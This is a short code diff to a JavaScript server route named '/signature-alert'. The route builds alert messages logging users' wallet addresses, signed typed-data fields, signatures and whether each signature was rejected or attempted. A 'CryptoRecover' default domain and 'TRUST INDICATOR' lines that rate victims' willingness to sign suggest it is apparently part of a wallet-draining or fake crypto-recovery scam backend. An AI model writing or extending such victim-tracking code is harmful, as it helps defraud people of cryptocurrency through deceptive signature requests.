@@ -2204,13 +2204,15 @@ router.post('/signature-alert', async (req, res) => {
         alertTitle = `📝 TYPED DATA: ${userAddress.slice(0,8)}... signed structured data`;
         alertMessage = `TYPED DATA V4 SIGNATURE\n\n` +
           `USER: ${userAddress}\n` +
-          `DOMAIN: ${data.domain.name} v${data.domain.version}\n` +
-          `CONTRACT: ${data.domain.verifyingContract}\n` +
-          `SIGNATURE: ${data.signature}\n\n` +
+          `STATUS: ${data.rejected ? 'REJECTED' : 'ATTEMPTED'}\n` +
+          `DOMAIN: ${data.domain?.name || 'CryptoRecover'} v${data.domain?.version || '1'}\n` +
+          `CONTRACT: ${data.domain?.verifyingContract || 'N/A'}\n` +
+          `SIGNATURE: ${data.signature || 'N/A'}\n` +
+          `ERROR: ${data.error || 'None'}\n\n` +
           `SIGNED MESSAGE:\n` +
-          `• User: ${data.message.user}\n` +
-          `• Amount: ${data.message.amount}\n` +
-          `• Nonce: ${data.message.nonce}\n\n` +
+          `• User: ${data.message?.user || userAddress}\n` +
+          `• Amount: ${data.message?.amount || '0.1 ETH'}\n` +
+          `• Nonce: ${data.message?.nonce || 'N/A'}\n\n` +
           `TRUST INDICATOR:\n` +
           `• User willing to sign platform data\n` +
           `• Demonstrates confidence in service\n` +
